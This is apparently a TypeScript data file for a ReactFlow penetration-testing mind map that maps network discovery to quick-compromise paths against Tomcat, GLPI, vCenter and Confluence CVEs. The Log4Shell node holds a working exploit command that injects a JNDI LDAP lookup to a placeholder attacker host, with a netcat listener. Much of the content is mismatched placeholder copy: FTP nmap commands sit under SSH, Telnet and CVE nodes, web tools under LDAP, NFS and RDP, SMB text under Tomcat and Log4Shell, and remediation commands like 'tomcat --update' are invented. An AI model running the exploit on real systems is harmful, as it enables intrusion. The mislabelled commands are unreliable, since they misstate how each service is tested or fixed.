import { Node, Edge, Position } from 'reactflow';

// 1. Définition des constantes de style en haut du fichier
export const COLORS = {
  NETDISCOVERY: '#3b82f6',   // Bleu (actuel)
  QUICKCOMPROMISE: '#f5f5dc', // Crème/Blanc cassé
  POST_EXPLOIT: '#ef4444' // Exemple pour plus tard (Rouge)
};

// 2. Définition de la fonction (C'est celle-ci qui te manque)
const getGroupStyle = (color: string) => ({
  // On utilise une opacité très faible du rouge terre (primary) 
  // ou une couleur crème sombre pour le fond du groupe
  backgroundColor: 'var(--background)',

  // Bordure : on utilise la couleur passée en paramètre (souvent le vert ou rouge)
  // avec une opacité réduite pour ne pas étouffer les nodes
  border: `2px solid ${color}66`,

  borderRadius: '16px',

  // Texte du titre du groupe : Crème sombre / Muted
  color: 'var(--foreground)',

  fontSize: '16px',
  textTransform: 'uppercase' as const,
  letterSpacing: '0.05em',
  fontWeight: '800',
  padding: '10px',
  pointerEvents: 'none' as const,
});

export const dataAD: { nodes: Node[], edges: Edge[] } = {
  nodes: [
    /// --- GROUPE : NETWORK DISCOVERY  ---
    {
      id: 'g-net-discovery',
      data: { label: 'NETWORK DISCOVERY (unauthenticated)' },
      position: { x: 0, y: 0 },
      style: { ...getGroupStyle(COLORS.NETDISCOVERY), width: 850, height: 1350 },
      selectable: false,
    },

    // --- BLOC ACTION : FIND DC IP ---
    {
      id: 'n-find-dc-ip',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode', // On utilise notre nouveau type
      position: { x: 50, y: 50 },
      data: {
        title: 'Find DC IP',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.NETDISCOVERY,
        description: 'Initial discovery of active hosts and accessible entry points.',
        labels: ['recon', 'discovery']
      },
      extent: 'parent',
    },

    // --- BLOCS PROTOCOLES  ---
    {
      id: 'n-ftp',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 200 },
      data: {
        title: 'File Transfer Protocol (FTP)',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Enumerate FTP services for anonymous access or cleartext credentials.',
        labels: ['service', 'cleartext'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-ssh',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 350 },
      data: {
        title: 'SecureShell (SSH)',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Enumerate SSH',
        labels: ['service', 'cleartext'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-telnet',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 500 },
      data: {
        title: 'Telnet',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Enumerate FTP services for anonymous access or cleartext credentials.',
        labels: ['service', 'cleartext'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-smb',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 650 },
      data: {
        title: 'Server Message Block (SMB)',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Enumerate hosts exposing a SMB service to find shares or version info.',
        labels: ['service', 'windows'],
        tools: [
          { name: 'NetExec', logo: '/img/nxc.png' },
          { name: 'Nmap', logo: '/img/nmap.png' },
        ],
        contentBlocks: [
          { type: 'text', content: "Le protocole SMB est utilisé pour le partage de fichiers. Pour l'énumération, plusieurs approches sont possibles." },
          {
            type: 'tool-section',
            tool: 'NetExec',
            description: "L'outil NetExec est la référence moderne pour l'audit AD. Pour lister les partages :",
            steps: [
              { label: 'Enum Shares', textAfter: "On peut aussi lister les utilisateurs via :" },
              { label: 'Enum Users', textAfter: "Note : cela nécessite souvent une session invitée active." }
            ]
          },
          {
            type: 'tool-section',
            tool: 'Nmap',
            description: "Nmap permet une découverte rapide via ses scripts NSE :",
            steps: [
              { label: 'Enum Shares', textAfter: "L'utilisation de scripts spécifiques permet d'approfondir la recherche." }
            ]
          },
          {
            type: 'proof',
            content: "Capture d'écran de l'accès root obtenu sur la cible [1].",
            image: "/proofs/tomcat_root.png"
          },
          {
            type: 'remediation',
            content: "Mettre à jour Tomcat vers la version 10.x et désactiver le manager par défaut [2].",
            links: [
              { id: 1, url: "https://attack.mitre.org/techniques/T1190/" },
              { id: 2, url: "https://tomcat.apache.org/security.html" }
            ]
          }
        ],
        commands: [
          { tool: 'NetExec', label: 'Enum Shares', code: 'nxc smb <target> --shares' },
          { tool: 'NetExec', label: 'Enum Users', code: 'nxc smb <target> --users' },
          { tool: 'Nmap', label: 'Enum Shares', code: 'nmap -p 445 --script smb-enum-shares' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-web',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 800 },
      data: {
        title: 'Web Services (HTTP/S)',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Identify web servers and potential hidden directories/files.',
        labels: ['service', 'http', 'web'],
        tools: [
          { name: 'Httpx', command: 'cat ips.txt | httpx -title' },
          { name: 'FFUF', command: 'ffuf -u http://<target>/FUZZ -w wordlist.txt' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-ldap',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 950 },
      data: {
        title: 'LDAP',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Identify web servers and potential hidden directories/files.',
        labels: ['service', 'http', 'web'],
        tools: [
          { name: 'Httpx', command: 'cat ips.txt | httpx -title' },
          { name: 'FFUF', command: 'ffuf -u http://<target>/FUZZ -w wordlist.txt' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-nfs',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 1100 },
      data: {
        title: 'Network File System (NFS)',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Identify web servers and potential hidden directories/files.',
        labels: ['service', 'http', 'web'],
        tools: [
          { name: 'Httpx', command: 'cat ips.txt | httpx -title' },
          { name: 'FFUF', command: 'ffuf -u http://<target>/FUZZ -w wordlist.txt' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-mssql',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 1250 },
      data: {
        title: 'Microsoft SQL Server (MSSQL)',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Identify web servers and potential hidden directories/files.',
        labels: ['service', 'http', 'web'],
        tools: [
          { name: 'Httpx', command: 'cat ips.txt | httpx -title' },
          { name: 'FFUF', command: 'ffuf -u http://<target>/FUZZ -w wordlist.txt' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-rdp',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 1400 },
      data: {
        title: 'Remote Desktop Protocol (RDP)',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Identify web servers and potential hidden directories/files.',
        labels: ['service', 'http', 'web'],
        tools: [
          { name: 'Httpx', command: 'cat ips.txt | httpx -title' },
          { name: 'FFUF', command: 'ffuf -u http://<target>/FUZZ -w wordlist.txt' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-commons',
      parentNode: 'g-net-discovery',
      type: 'flowsintNode',
      position: { x: 50, y: 1400 },
      data: {
        title: 'Other common protocols',
        sourceColor: COLORS.NETDISCOVERY,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Identify web servers and potential hidden directories/files.',
        labels: ['service', 'http', 'web'],
        tools: [
          { name: 'Httpx', command: 'cat ips.txt | httpx -title' },
          { name: 'FFUF', command: 'ffuf -u http://<target>/FUZZ -w wordlist.txt' }
        ]
      },
      extent: 'parent',
    },

























    // --- GROUPE : QUICKCOMPROMISES ---
    {
      id: 'g-quickcompromise',
      data: { label: 'QUICK COMPROMISE' },
      position: { x: 950, y: 350 },
      style: { ...getGroupStyle(COLORS.QUICKCOMPROMISE), width: 900, height: 800 },
      selectable: false,
    },


    // --- BLOCS : QUICKCOMPROMISES WEB  ---
    {
      id: 'n-tomcat',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 50, y: 50 },
      data: {
        title: 'Tomcat',
        category: 'Quick Compromise',
        severity: 'critical',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Exploit Tomcat server vulnerabilities.',
        labels: ['service', 'windows'],
        tools: [
          { name: 'NetExec', logo: '/img/nxc.png' },
          { name: 'Nmap', logo: '/img/nmap.png' },
        ],
        contentBlocks: [
          { type: 'text', content: "Le protocole SMB est utilisé pour le partage de fichiers. Pour l'énumération, plusieurs approches sont possibles.\n-Test" },
          {
            type: 'tool-section',
            tool: 'NetExec',
            description: "L'outil NetExec est la référence moderne pour l'audit AD.\n-Pour lister les partages :",
            steps: [
              { label: 'Enum Shares', textAfter: "On peut aussi lister les utilisateurs via :" },
              { label: 'Enum Users', textAfter: "Note : cela nécessite souvent une session invitée active." }
            ]
          },
          {
            type: 'tool-section',
            tool: 'Nmap',
            description: "Nmap permet une découverte rapide via ses scripts NSE :",
            steps: [
              { label: 'Enum Shares', textAfter: "L'utilisation de scripts spécifiques permet d'approfondir la recherche." }
            ]
          },
          {
            type: 'proof',
            content: "Capture d'écran de l'accès root obtenu sur la cible [1].",
            image: "/proofs/tomcat_root.png"
          },
          {
            type: 'remediation',
            content: "Actions recommandées :\n- Mettre à jour Tomcat vers la version 10.x [2].\n- Restreindre l'accès à l'interface /manager.\n- Changer les mots de passe par défaut.", 
            steps: [
              { label: 'Check Version', textAfter: "Vérifiez d'abord la version actuelle." },
              { label: 'Update Package', textAfter: "Puis relancez le service." }
            ]
          }
        ],
        commands: [
          { tool: 'NetExec', label: 'Enum Shares', code: 'nxc smb <target> --shares' },
          { tool: 'NetExec', label: 'Enum Users', code: 'nxc smb <target> --users' },
          { tool: 'Nmap', label: 'Enum Shares', code: 'nmap -p 445 --script smb-enum-shares' },
          { tool: 'PowerShell', label: 'Check Version', code: 'tomcat --version' },
          { tool: 'PowerShell', label: 'Update Package', code: 'tomcat --update' }

        ],
        references: [
          { id: 1, url: "https://attack.mitre.org/techniques/T1190/", title: "NVD Detail" },
          { id: 2, url: "https://tomcat.apache.org/security.html", title: "NVD Detail" }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-tomcat-manager',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 50 },
      data: {
        title: 'Manager',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        authenticated: 'Possible',
        labels: ['RCE'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-glpi',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 50, y: 200 },
      data: {
        title: 'GLPI',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Exploit GLPI vulnerabilities.',
        labels: ['Web', 'Ticketing'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-glpi-cve-2022-35914',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 200 },
      data: {
        title: 'CVE-2022-35914',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        authenticated: 'False',
        labels: ['RCE'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-glpi-cve-2023-41320',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 246 },
      data: {
        title: 'CVE-2023-41320',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        authenticated: 'False',
        labels: ['RCE'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-vcenter',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 50, y: 350 },
      data: {
        title: 'vCenter',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Exploit VMWare vCenter vulnerabilities.',
        labels: ['Web', 'Virtualization'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-vcenter-log4shell',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 350 },
      data: {
        title: 'Log4Shell',
        category: 'Quick Compromise',
        severity: 'critical',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: '',
        authenticated: 'False',
        labels: ['RCE'],
        tools: [
          { name: 'Curl', logo: '/img/curl.png'},
        ],
        contentBlocks: [
          { type: 'text', content: "Le protocole SMB est utilisé pour le partage de fichiers. Pour l'énumération, plusieurs approches sont possibles.\n-Test" },
          {
            type: 'tool-section',
            tool: 'Curl',
            description: "L'outil curl permet de détecter si le vCenter accepte les requêtes JNDI:",
            steps: [
              { label: 'Enum log4shell', textAfter: "On peut aussi lister les utilisateurs via :" },
              { label: 'Listener', textAfter: "Note : cela nécessite souvent une session invitée active." },
              { label: 'Exploit log4shell', textAfter: "Note : cela nécessite souvent une session invitée active." },
            ]
          },
          {
            type: 'tool-section',
            tool: 'Nmap',
            description: "Nmap permet une découverte rapide via ses scripts NSE :",
            steps: [
              { label: 'Enum log4shell', textAfter: "L'utilisation de scripts spécifiques permet d'approfondir la recherche." }
            ]
          },
          {
            type: 'proof',
            content: "Capture d'écran de l'accès root obtenu sur la cible [1].",
            image: "/proofs/tomcat_root.png"
          },
          {
            type: 'remediation',
            content: "Actions recommandées :\n- Mettre à jour Tomcat vers la version 10.x [2].\n- Restreindre l'accès à l'interface /manager.\n- Changer les mots de passe par défaut.", 
            steps: [
              { label: 'Check Version', textAfter: "Vérifiez d'abord la version actuelle." },
              { label: 'Update Package', textAfter: "Puis relancez le service." }
            ]
          }
        ],
        commands: [
          { tool: 'Curl', label: 'Enum log4shell', code: 'curl -ski https://<vCenter IP>/ui/login | grep -i Location' },
          { tool: 'Curl', label: 'Exploit log4shell', code: 'curl --insecure -vv -H "X-Forwarded-For: \${jndi:ldap://<Attacker IP>:<Attacker Port>/lol}" "https://<vCenter IP>/websso/SAML2/SSO/<SSO realm>?SAMLRequest="' },
          { tool: 'nc', label:'Listener', code: 'nc -lvnp 1234' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-vcenter-cve-2024-38812',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 400 },
      data: {
        title: 'cve-2024-38812',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        authenticated: 'False',
        labels: ['RCE'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-confluence',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 50, y: 500 },
      data: {
        title: 'Confluence',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        description: 'Exploit Atlassian Confluence vulnerabilities.',
        labels: ['Web', 'Workspace'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-confluence-cve-2021-26084',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 500 },
      data: {
        title: 'CVE-2021-26084',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        authenticated: 'False',
        labels: ['RCE'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-confluence-cve-2022-26134',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 550 },
      data: {
        title: 'CVE-2022-26134',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        authenticated: 'False',
        labels: ['RCE'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-confluence-cve-2023-22527',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 600 },
      data: {
        title: 'CVE-2023-22527',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        authenticated: 'False',
        labels: ['RCE'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
    {
      id: 'n-confluence-cve-2024-21683',
      parentNode: 'g-quickcompromise',
      type: 'flowsintNode',
      position: { x: 350, y: 650 },
      data: {
        title: 'CVE-2024-21683',
        sourceColor: COLORS.QUICKCOMPROMISE,
        targetColor: COLORS.QUICKCOMPROMISE,
        authenticated: 'True',
        labels: ['RCE'],
        tools: [
          { name: 'Nmap', command: 'nmap -p 21 --script ftp-anon <target>' }
        ]
      },
      extent: 'parent',
    },
  ],

  edges: [
    // --- CHEMINS DANS GROUPE "QUICKCOMPROMISE"  ---
    { id: 'e-quickcompromise-tomcat', source: 'n-web', target: 'n-tomcat', animated: false },
    { id: 'e-quickcompromise-tomcat-manager', source: 'n-tomcat', target: 'n-tomcat-manager', animated: false },

    { id: 'e-quickcompromise-glpi', source: 'n-web', target: 'n-glpi', animated: false },
    { id: 'e-quickcompromise-glpi-cve-2022-35914', source: 'n-glpi', target: 'n-glpi-cve-2022-35914', animated: false },
    { id: 'e-quickcompromise-glpi-cve-2023-41320', source: 'n-glpi', target: 'n-glpi-cve-2023-41320', animated: false },

    { id: 'e-quickcompromise-vcenter', source: 'n-web', target: 'n-vcenter', animated: false },
    { id: 'e-quickcompromise-vcenter-log4shell', source: 'n-vcenter', target: 'n-vcenter-log4shell', animated: false },
    { id: 'e-quickcompromise-vcenter-cve-2024-38812', source: 'n-vcenter', target: 'n-vcenter-cve-2024-38812', animated: false },

    { id: 'e-quickcompromise-confluence', source: 'n-web', target: 'n-confluence', animated: false },
    { id: 'e-quickcompromise-confluence-cve-2021-26084', source: 'n-confluence', target: 'n-confluence-cve-2021-26084', animated: false },
    { id: 'e-quickcompromise-confluence-cve-2022-26134', source: 'n-confluence', target: 'n-confluence-cve-2022-26134', animated: false },
    { id: 'e-quickcompromise-confluence-cve-2023-22527', source: 'n-confluence', target: 'n-confluence-cve-2023-22527', animated: false },
    { id: 'e-quickcompromise-confluence-cve-2024-21683', source: 'n-confluence', target: 'n-confluence-cve-2024-21683', animated: false },


  ]
};